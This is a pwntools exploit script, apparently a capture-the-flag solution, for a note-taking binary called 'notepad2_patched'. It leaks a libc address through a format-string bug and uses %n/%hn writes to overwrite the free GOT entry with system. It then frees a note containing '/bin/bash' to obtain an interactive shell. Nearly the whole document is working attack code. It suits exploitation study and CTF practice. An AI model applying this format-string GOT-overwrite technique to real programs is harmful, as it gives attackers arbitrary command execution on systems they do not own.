#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("notepad2_patched")
libc = ELF("libc.so.6")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

def create(index, note):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", note)

def view(index):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(index).encode())

def delete(index):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(index).encode())

# Plan:

# Addresses

# Functions

io = start()

# Leak a libc address from the stack and calculate libc base
create(0, b"|%13$llx|") # the '|' is to make recving easier
view(0)

io.recvuntil(b"|")
libc_leak = int(io.recvuntil(b"|")[:-1], 16) # [:-1] slices of the last byte ('|')
log.info("Libc leak @ %s" % hex(libc_leak))

libc.address = libc_leak - 0x7ffff7c28150 + 0x7ffff7c00000 # this means offset + 0x7ffff7c00000
log.info("Libc base @ %s" % hex(libc.address))

# Remove the first chunk
delete(0)

# Calculate offsets of free and system


# Write to the lowest byte of the address
system_low = (libc.sym.system & 0xffff)
free_low = (elf.got.free & 0xffff)

off = 0
if system_low > free_low:
    off = system_low - free_low - 2
else:
    off = (0x10000 + free_low) - system_low - 2

payload = f'%c%c%c%c%c%c%{elf.got.free-6}c%n'.encode()
payload += f'%c%c%{off}c%hn'.encode()

create(0, payload)
view(0) # format string attack

system_low = (libc.sym.system & 0xffff0000) >> 16
free_low = ((elf.got.free + 2) & 0xffff)


# write to the second lowest byte of the address
off = 0
if system_low > free_low:
    off = system_low - free_low - 2
else:
    off = (0x10000 + free_low) - system_low - 2

payload = f'%c%c%c%c%c%c%{elf.got.free-6 + 2}c%n'.encode()
payload += f'%c%c%{off}c%hn'.encode()

create(1, payload)
view(1) # format string attack

create(2, b"/bin/bash")
delete(2) # this will call system instead of free and address containing /bin/sh


io.interactive()
